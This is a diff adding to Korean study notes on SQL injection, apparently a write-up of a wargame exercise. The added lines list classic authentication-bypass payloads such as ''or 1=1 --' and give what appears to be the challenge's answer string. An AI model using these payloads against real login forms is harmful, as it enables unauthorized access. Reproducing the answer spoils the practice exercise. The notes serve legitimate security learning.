@@ -72,3 +72,19 @@ SQL Injection - 쿼리에 대해 참인 결과 값을 이용해 DB의 응답을 
 ;: 쿼리 구분 기호
 --, #: 해당 라인 주석 기호
 /* */: /*와 */사이 구문 주석 기호
+
+'or 1=1 --
+'or 1 like 1 --
+'or 1=1 #
+'or 2>1 --
+
+![[Pasted image 20241007151153.png]]
+- DB에서 잘못된 쿼리에도 반응하는 것을 알 수 있다.
+
+![[Pasted image 20241007151242.png]]
+' or 1 like 1
+![[Pasted image 20241007151326.png]]
+![[Pasted image 20241007151406.png]]
+suninatastopofworld!
+
+![[Pasted image 20241007151652.png]]
